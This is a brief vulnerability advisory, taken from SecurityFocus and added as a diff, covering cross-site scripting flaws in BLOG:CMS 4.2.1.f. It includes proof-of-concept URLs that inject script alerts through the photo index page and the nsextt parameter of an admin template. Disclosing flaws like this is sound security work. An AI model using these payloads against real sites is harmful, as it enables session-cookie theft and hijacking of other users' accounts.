@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/48132/info
+
+BLOG:CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+BLOG:CMS 4.2.1.f is vulnerable; other versions may also be affected. 
+
+http://www.example.com/blogcms/photo/index.php?"<script>alert(0x0029A)</script>
+http://www.example.com/blogcms/photo/index.php?"<script>alert(&#039;XSS&#039;);</script>
+
+http://www.example.com/blogcms/photo/templates/admin_default/confirm.tpl.php?nsextt="<script>alert(&#039;XSS&#039;);</script>
+http://www.example.com/blogcms/photo/templates/admin_default/confirm.tpl.php?nsextt="<script>alert(0x0029A)</script>
+
+http://www.example.com/blogcms/admin/plugins/mailtoafriend/mailfriend.php
